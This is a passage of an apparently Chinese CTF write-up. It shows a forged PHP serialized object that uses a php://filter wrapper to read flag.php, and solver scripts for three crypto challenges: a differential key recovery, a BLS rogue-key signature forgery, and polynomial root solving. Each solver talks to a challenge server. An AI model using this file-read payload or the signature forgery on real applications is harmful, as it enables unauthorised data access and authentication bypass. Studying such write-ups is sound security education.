<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上传的1.dat 利用了php伪协议</span><br><span class="line">a:4:&#123;s:9:&quot;timestamp&quot;;i:1761919039;s:7:&quot;version&quot;;s:3:&quot;1.0&quot;;s:4:&quot;blog&quot;;O:4:&quot;Blog&quot;:8:&#123;s:2:&quot;id&quot;;i:4;s:5:&quot;title&quot;;s:6:&quot;Test 4&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;s:7:&quot;user_id&quot;;i:1;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:10:&quot;created_at&quot;;s:19:&quot;2025-10-31 21:45:45&quot;;s:10:&quot;updated_at&quot;;s:19:&quot;2025-10-31 21:45:45&quot;;s:8:&quot;template&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;s:9:&quot;signature&quot;;s:62:&quot;3a98354afb44dfadb382da90dceebf1e60cf24d85912bf175c2d7438c6d460&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="84.png" alt="84"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Smile盒"><a href="#Smile盒" class="headerlink" title="Smile盒"></a>Smile盒</h3><p>获取0x000-0xfff的所有数据再爆破怎么想都不太现实 故改成获取少量数据后碰撞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line"># 定义 S-box 和 P-box</span><br><span class="line">S = [13, 11, 6, 5, 2, 7, 3, 4, 9, 0, 10, 1, 12, 15, 8, 14]</span><br><span class="line">P = (0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15)</span><br><span class="line"></span><br><span class="line">def deblock(m):</span><br><span class="line">    return [(m &gt;&gt; 12) &amp; 0xF, (m &gt;&gt; 8) &amp; 0xF, (m &gt;&gt; 4) &amp; 0xF, m &amp; 0xF]</span><br><span class="line"></span><br><span class="line">def block(nibbles):</span><br><span class="line">    return (nibbles[0] &lt;&lt; 12) | (nibbles[1] &lt;&lt; 8) | (nibbles[2] &lt;&lt; 4) | nibbles[3]</span><br><span class="line"></span><br><span class="line">def S_apply(nibbles):</span><br><span class="line">    return [S[i] for i in nibbles]</span><br><span class="line"></span><br><span class="line">def permute_bits(x):</span><br><span class="line">    bits = [(x &gt;&gt; (15 - i)) &amp; 1 for i in range(16)] </span><br><span class="line">    new_bits = [0] * 16</span><br><span class="line">    for i in range(16):</span><br><span class="line">        new_pos = P[i]</span><br><span class="line">        new_bits[new_pos] = bits[i]</span><br><span class="line">    result = 0</span><br><span class="line">    for i in range(16):</span><br><span class="line">        result = (result &lt;&lt; 1) | new_bits[i]</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def round1(m, k0):</span><br><span class="line">    u = m ^ k0</span><br><span class="line">    nibbles = deblock(u)</span><br><span class="line">    v_nibbles = S_apply(nibbles)</span><br><span class="line">    v = block(v_nibbles)</span><br><span class="line">    x = permute_bits(v)</span><br><span class="line">    return x</span><br><span class="line"></span><br><span class="line">def round2_sbox(x):</span><br><span class="line">    nibbles = deblock(x)</span><br><span class="line">    z_nibbles = S_apply(nibbles)</span><br><span class="line">    z = block(z_nibbles)</span><br><span class="line">    return z</span><br><span class="line"></span><br><span class="line">def fast_differential_attack(conn, plaintexts):</span><br><span class="line">    &quot;&quot;&quot;快速差分攻击，在单次连接内完成&quot;&quot;&quot;</span><br><span class="line">    ciphertexts = []</span><br><span class="line">    </span><br><span class="line">    # 收集密文</span><br><span class="line">    for msg in plaintexts:</span><br><span class="line">        conn.recvuntil(b&quot;Your input: &quot;)</span><br><span class="line">        conn.sendline(hex(msg)[2:].encode())</span><br><span class="line">        line = conn.recvline().decode().strip()</span><br><span class="line">        if line.startswith(&quot;Output: 0x&quot;):</span><br><span class="line">            hex_str = line[10:]</span><br><span class="line">            c = int(hex_str, 16)</span><br><span class="line">            ciphertexts.append(c)</span><br><span class="line">            print(f&quot;m=&#123;msg:04x&#125; -&gt; c=&#123;c:04x&#125;&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;Unexpected output:&quot;, line)</span><br><span class="line">            return None</span><br><span class="line">    </span><br><span class="line">    # 快速差分分析</span><br><span class="line">    m1, m2, m3 = plaintexts[0], plaintexts[1], plaintexts[2]</span><br><span class="line">    c1, c2, c3 = ciphertexts[0], ciphertexts[1], ciphertexts[2]</span><br><span class="line">    </span><br><span class="line">    c1_nib, c2_nib = deblock(c1), deblock(c2)</span><br><span class="line">    </span><br><span class="line">    # 优化搜索：使用更有效的差分特征</span><br><span class="line">    candidate_keys = []</span><br><span class="line">    </span><br><span class="line">    for k0 in range(0x10000):</span><br><span class="line">        if k0 % 0x1000 == 0:  # 减少进度输出频率</span><br><span class="line">            print(f&quot;Progress: k0 = &#123;k0:04x&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">        x1 = round1(m1, k0)</span><br><span class="line">        x2 = round1(m2, k0)</span><br><span class="line">        x1_nib, x2_nib = deblock(x1), deblock(x2)</span><br><span class="line">        </span><br><span class="line">        # 快速筛选：检查差分是否可能</span><br><span class="line">        valid = True</span><br><span class="line">        possible_k1_nib = [[] for _ in range(4)]</span><br><span class="line">        </span><br><span class="line">        for i in range(4):</span><br><span class="line">            delta_c = c1_nib[i] ^ c2_nib[i]</span><br><span class="line">            found = False</span><br><span class="line">            for k1_i in range(16):</span><br><span class="line">                s1 = S[x1_nib[i] ^ k1_i]</span><br><span class="line">                s2 = S[x2_nib[i] ^ k1_i]</span><br><span class="line">                if s1 ^ s2 == delta_c:</span><br><span class="line">                    possible_k1_nib[i].append(k1_i)</span><br><span class="line">                    found = True</span><br><span class="line">            if not found:</span><br><span class="line">                valid = False</span><br><span class="line">                break</span><br><span class="line">        </span><br><span class="line">        if not valid:</span><br><span class="line">            continue</span><br><span class="line">        </span><br><span class="line">        # 生成k1候选并验证</span><br><span class="line">        for k1_comb in itertools.product(*possible_k1_nib):</span><br><span class="line">            k1 = (k1_comb[0] &lt;&lt; 12) | (k1_comb[1] &lt;&lt; 8) | (k1_comb[2] &lt;&lt; 4) | k1_comb[3]</span><br><span class="line">            </span><br><span class="line">            # 计算k2并验证第三个明文</span><br><span class="line">            z1 = round2_sbox(x1 ^ k1)</span><br><span class="line">            k2 = z1 ^ c1</span><br><span class="line">            </span><br><span class="line">            x3 = round1(m3, k0)</span><br><span class="line">            z3 = round2_sbox(x3 ^ k1)</span><br><span class="line">            c3_calc = z3 ^ k2</span><br><span class="line">            </span><br><span class="line">            if c3_calc == c3:</span><br><span class="line">                # 用第四个明文进一步验证（如果收集了更多）</span><br><span class="line">                if len(plaintexts) &gt; 3:</span><br><span class="line">                    m4, c4 = plaintexts[3], ciphertexts[3]</span><br><span class="line">                    x4 = round1(m4, k0)</span><br><span class="line">                    z4 = round2_sbox(x4 ^ k1)</span><br><span class="line">                    if (z4 ^ k2) == c4:</span><br><span class="line">                        candidate_keys.append((k0, k1, k2))</span><br><span class="line">                else:</span><br><span class="line">                    candidate_keys.append((k0, k1, k2))</span><br><span class="line">        </span><br><span class="line">        # 如果找到候选密钥，立即返回（优化速度）</span><br><span class="line">        if candidate_keys:</span><br><span class="line">            break</span><br><span class="line">    </span><br><span class="line">    return candidate_keys</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    max_attempts = 3  # 最大尝试次数</span><br><span class="line">    </span><br><span class="line">    for attempt in range(max_attempts):</span><br><span class="line">        print(f&quot;\n=== Attempt &#123;attempt + 1&#125; ===&quot;)</span><br><span class="line">        </span><br><span class="line">        try:</span><br><span class="line">            # 连接服务器</span><br><span class="line">            r = remote(&quot;8.147.132.32&quot;, 36646)</span><br><span class="line">            </span><br><span class="line">            # 选择高效的明文（差分特征明显的）</span><br><span class="line">            plaintexts = [0x0000, 0x0001, 0x0002, 0x0004]  # 小差分</span><br><span class="line">            </span><br><span class="line">            # 执行快速攻击</span><br><span class="line">            candidates = fast_differential_attack(r, plaintexts)</span><br><span class="line">            </span><br><span class="line">            if candidates:</span><br><span class="line">                print(f&quot;Found &#123;len(candidates)&#125; candidate key sets&quot;)</span><br><span class="line">                </span><br><span class="line">                # 尝试每个候选密钥</span><br><span class="line">                for i, (k0, k1, k2) in enumerate(candidates):</span><br><span class="line">                    print(f&quot;Trying candidate &#123;i+1&#125;: k2=&#123;k2:04x&#125;&quot;)</span><br><span class="line">                    </span><br><span class="line">                    r.recvuntil(b&quot;Your input: &quot;)</span><br><span class="line">                    r.sendline(b&#x27;k&#x27;)</span><br><span class="line">                    r.recvuntil(b&quot;Your key:&quot;)</span><br><span class="line">                    r.sendline(hex(k2).encode())</span><br><span class="line">                    </span><br><span class="line">                    response = r.recvline().decode().strip()</span><br><span class="line">                    print(&quot;Response:&quot;, response)</span><br><span class="line">                    </span><br><span class="line">                    if &quot;Wrong&quot; not in response and &quot;Bye&quot; not in response:</span><br><span class="line">                        print(&quot;SUCCESS! Flag found!&quot;)</span><br><span class="line">                        # 接收所有输出</span><br><span class="line">                        while True:</span><br><span class="line">                            try:</span><br><span class="line">                                line = r.recvline(timeout=2).decode().strip()</span><br><span class="line">                                if line:</span><br><span class="line">                                    print(line)</span><br><span class="line">                            except:</span><br><span class="line">                                break</span><br><span class="line">                        r.close()</span><br><span class="line">                        return</span><br><span class="line">                    else:</span><br><span class="line">                        print(&quot;Wrong key, attempt failed.&quot;)</span><br><span class="line">                        break</span><br><span class="line">                </span><br><span class="line">            else:</span><br><span class="line">                print(&quot;No keys found in this attempt.&quot;)</span><br><span class="line">            </span><br><span class="line">            r.close()</span><br><span class="line">            </span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(f&quot;Error in attempt &#123;attempt + 1&#125;: &#123;e&#125;&quot;)</span><br><span class="line">            try:</span><br><span class="line">                r.close()</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">    </span><br><span class="line">    print(&quot;All attempts failed.&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="78.png" alt="78"></p>
<h3 id="BLS多重签名：零的裂变"><a href="#BLS多重签名：零的裂变" class="headerlink" title="BLS多重签名：零的裂变"></a>BLS多重签名：零的裂变</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from py_ecc.bls import G2ProofOfPossession as bls</span><br><span class="line">import socket</span><br><span class="line">import json</span><br><span class="line">import secrets</span><br><span class="line"></span><br><span class="line">order = 52435875175126190479447740508185965837690552500527637822603658699938581184513</span><br><span class="line"></span><br><span class="line">def send_command(command):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&quot;8.147.132.32&quot;, 42561))</span><br><span class="line">    s.sendall(json.dumps(command).encode() + b&#x27;\n&#x27;)</span><br><span class="line">    response = s.recv(1024).decode()</span><br><span class="line">    s.close()</span><br><span class="line">    return json.loads(response)</span><br><span class="line"></span><br><span class="line"># 1. 获取服务器信息</span><br><span class="line">info = send_command(&#123;&quot;type&quot;: &quot;get_info&quot;&#125;)</span><br><span class="line">pk_server_hex = info[&quot;message&quot;][&quot;server_pk&quot;]</span><br><span class="line">pop_server_hex = info[&quot;message&quot;][&quot;pop_server&quot;]</span><br><span class="line"></span><br><span class="line"># 2. 生成密钥对</span><br><span class="line">sk1 = secrets.randbelow(order - 1) + 1</span><br><span class="line">sk2 = (-sk1) % order</span><br><span class="line">pk1 = bls.SkToPk(sk1)</span><br><span class="line">pk2 = bls.SkToPk(sk2)</span><br><span class="line">pop1 = bls.Sign(sk1, b&quot;POP&quot;)</span><br><span class="line">pop2 = bls.Sign(sk2, b&quot;POP&quot;)</span><br><span class="line"></span><br><span class="line"># 3. 注册公钥</span><br><span class="line">send_command(&#123;&quot;type&quot;: &quot;register&quot;, &quot;pk&quot;: pk1.hex(), &quot;pop&quot;: pop1.hex()&#125;)</span><br><span class="line">send_command(&#123;&quot;type&quot;: &quot;register&quot;, &quot;pk&quot;: pk2.hex(), &quot;pop&quot;: pop2.hex()&#125;)</span><br><span class="line"></span><br><span class="line"># 4. 获取服务器签名</span><br><span class="line">sig_server = send_command(&#123;&quot;type&quot;: &quot;sign&quot;, &quot;msg&quot;: &quot;get_flag&quot;&#125;)[&quot;message&quot;]</span><br><span class="line">sig_server_bytes = bytes.fromhex(sig_server)</span><br><span class="line"></span><br><span class="line"># 5. 构造聚合签名</span><br><span class="line">sig1 = bls.Sign(sk1, b&quot;get_flag&quot;)</span><br><span class="line">sig2 = bls.Sign(sk2, b&quot;get_flag&quot;)</span><br><span class="line">agg_sig = bls.Aggregate([sig1, sig2, sig_server_bytes])</span><br><span class="line"></span><br><span class="line"># 6. 提交获取flag</span><br><span class="line">result = send_command(&#123;</span><br><span class="line">    &quot;type&quot;: &quot;get_flag&quot;,</span><br><span class="line">    &quot;pks&quot;: [pk1.hex(), pk2.hex(), pk_server_hex],</span><br><span class="line">    &quot;sig&quot;: agg_sig.hex()</span><br><span class="line">&#125;)</span><br><span class="line">print(result)</span><br><span class="line">&#123;&#x27;success&#x27;: True, &#x27;message&#x27;: &#x27;flag&#123;37b48d86-4c2f-4910-94f6-79bd2b521588&#125;&#x27;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Poly"><a href="#Poly" class="headerlink" title="Poly"></a>Poly</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">import uuid</span><br><span class="line">from sage.all import *</span><br><span class="line"></span><br><span class="line">def b2l(b: bytes) -&gt; int:</span><br><span class="line">    result = 0</span><br><span class="line">    for byte in b:</span><br><span class="line">        result = (result &lt;&lt; 8) | byte</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def l2b(n: int) -&gt; bytes:</span><br><span class="line">    result = b&quot;&quot;</span><br><span class="line">    while n &gt; 0:</span><br><span class="line">        result = bytes([n &amp; 0xff]) + result</span><br><span class="line">        n &gt;&gt;= 8</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"># 给定参数</span><br><span class="line">p = 30784558756838163538710632027143185397437897603217673077150297305544071001199</span><br><span class="line">c1 = 2909317260219356685336632301474678396728564531244632916913671591997406996972</span><br><span class="line">c2 = 4294738619365099885640900866122577092111906369664055461700321556058254607968</span><br><span class="line">s = 8215705534787817006092091346252328321484153279277254569529867991109185617083</span><br><span class="line"></span><br><span class="line"># 定义有限域</span><br><span class="line">Fp = GF(p)</span><br><span class="line"></span><br><span class="line">def solve_m1():</span><br><span class="line">    &quot;&quot;&quot;求解m1: c1 = m1^19 + m1^18 + 4*m1^17 mod p&quot;&quot;&quot;</span><br><span class="line">    # 因式分解: m1^17 * (m1^2 + m1 + 4) = c1 mod p</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Fp)</span><br><span class="line">    </span><br><span class="line">    # 方法1: 直接解高次方程</span><br><span class="line">    poly1 = x^19 + x^18 + 4*x^17 - c1</span><br><span class="line">    </span><br><span class="line">    # 因式分解后解低次方程</span><br><span class="line">    # 先找m1^17的根，再解二次方程</span><br><span class="line">    candidates = []</span><br><span class="line">    </span><br><span class="line">    # 尝试所有可能的17次根</span><br><span class="line">    for root in poly1.roots():</span><br><span class="line">        m1_candidate = int(root[0])</span><br><span class="line">        # 验证是否是有效消息（可转换为可打印字符）</span><br><span class="line">        try:</span><br><span class="line">            msg = l2b(m1_candidate)</span><br><span class="line">            if all(32 &lt;= b &lt; 127 for b in msg):  # 可打印ASCII字符</span><br><span class="line">                candidates.append((m1_candidate, msg))</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    </span><br><span class="line">    return candidates</span><br><span class="line"></span><br><span class="line">def solve_m2():</span><br><span class="line">    &quot;&quot;&quot;求解m2: c2 = 5*m2^19 + m2^18 + 4*m2^17 mod p&quot;&quot;&quot;</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Fp)</span><br><span class="line">    poly2 = 5*x^19 + x^18 + 4*x^17 - c2</span><br><span class="line">    </span><br><span class="line">    candidates = []</span><br><span class="line">    </span><br><span class="line">    for root in poly2.roots():</span><br><span class="line">        m2_candidate = int(root[0])</span><br><span class="line">        try:</span><br><span class="line">            msg = l2b(m2_candidate)</span><br><span class="line">            if all(32 &lt;= b &lt; 127 for b in msg):</span><br><span class="line">                candidates.append((m2_candidate, msg))</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    </span><br><span class="line">    return candidates</span><br><span class="line"></span><br><span class="line">def verify_solution(m1, m2):</span><br><span class="line">    &quot;&quot;&quot;验证第三个方程: s = m1^7 * m2^2 + m2 mod p&quot;&quot;&quot;</span><br><span class="line">    m1_fp = Fp(m1)</span><br><span class="line">    m2_fp = Fp(m2)</span><br><span class="line">    calculated_s = m1_fp^7 * m2_fp^2 + m2_fp</span><br><span class="line">    return calculated_s == Fp(s)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;求解m1...&quot;)</span><br><span class="line">    m1_candidates = solve_m1()</span><br><span class="line">    print(f&quot;找到 &#123;len(m1_candidates)&#125; 个可能的m1解&quot;)</span><br><span class="line">    </span><br><span class="line">    print(&quot;求解m2...&quot;)</span><br><span class="line">    m2_candidates = solve_m2()</span><br><span class="line">    print(f&quot;找到 &#123;len(m2_candidates)&#125; 个可能的m2解&quot;)</span><br><span class="line">    </span><br><span class="line">    print(&quot;\n验证所有组合...&quot;)</span><br><span class="line">    for m1_val, m1_msg in m1_candidates:</span><br><span class="line">        for m2_val, m2_msg in m2_candidates:</span><br><span class="line">            if verify_solution(m1_val, m2_val):</span><br><span class="line">                print(f&quot;\n找到正确解!&quot;)</span><br><span class="line">                print(f&quot;m1 (十六进制): &#123;m1_val:x&#125;&quot;)</span><br><span class="line">                print(f&quot;m2 (十六进制): &#123;m2_val:x&#125;&quot;)</span><br><span class="line">                print(f&quot;m1 原文: &#123;m1_msg.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)&#125;&quot;)</span><br><span class="line">                print(f&quot;m2 原文: &#123;m2_msg.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)&#125;&quot;)</span><br><span class="line">                </span><br><span class="line">                flag = m1_msg + m2_msg</span><br><span class="line">                print(f&quot;完整flag: &#123;flag.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)&#125;&quot;)</span><br><span class="line">                return</span><br><span class="line">    </span><br><span class="line">    print(&quot;未找到有效解，尝试直接多项式求解...&quot;)</span><br><span class="line">    </span><br><span class="line">    # 直接多项式求解方法</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Fp)</span><br><span class="line">    </span><br><span class="line">    # 解m1的方程</span><br><span class="line">    poly1 = x^19 + x^18 + 4*x^17 - c1</span><br><span class="line">    roots1 = poly1.roots()</span><br><span class="line">    </span><br><span class="line">    # 解m2的方程  </span><br><span class="line">    poly2 = 5*x^19 + x^18 + 4*x^17 - c2</span><br><span class="line">    roots2 = poly2.roots()</span><br><span class="line">    </span><br><span class="line">    print(f&quot;\n直接求解找到 &#123;len(roots1)&#125; 个m1根, &#123;len(roots2)&#125; 个m2根&quot;)</span><br><span class="line">    </span><br><span class="line">    # 暴力尝试所有组合</span><br><span class="line">    for r1, mult1 in roots1:</span><br><span class="line">        for r2, mult2 in roots2:</span><br><span class="line">            m1_val = int(r1)</span><br><span class="line">            m2_val = int(r2)</span><br><span class="line">            </span><br><span class="line">            if verify_solution(m1_val, m2_val):</span><br><span class="line">                print(&quot;通过直接求解找到正确解!&quot;)</span><br><span class="line">                try:</span><br><span class="line">                    m1_msg = l2b(m1_val)</span><br><span class="line">                    m2_msg = l2b(m2_val)</span><br><span class="line">                    flag = m1_msg + m2_msg</span><br><span class="line">                    print(f&quot;完整flag: &#123;flag.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)&#125;&quot;)</span><br><span class="line">                    return</span><br><span class="line">                except:</span><br><span class="line">                    print(f&quot;数值解: m1=&#123;m1_val:x&#125;, m2=&#123;m2_val:x&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">(sage-sh) nekos@nekobot:~$ sage &#x27;/cygdrive/e/web tool/1.sage&#x27;</span><br><span class="line">求解m1...</span><br><span class="line">找到 1 个可能的m1解</span><br><span class="line">求解m2...</span><br><span class="line">找到 1 个可能的m2解</span><br><span class="line"></span><br><span class="line">验证所有组合...</span><br><span class="line"></span><br><span class="line">找到正确解!</span><br><span class="line">m1 (十六进制): 666c61677b33626462323432342d353931612d3461</span><br><span class="line">m2 (十六进制): 39322d623538372d3734393531633861643139327d</span><br><span class="line">m1 原文: flag&#123;3bdb2424-591a-4a</span><br><span class="line">m2 原文: 92-b587-74951c8ad192&#125;</span><br><span 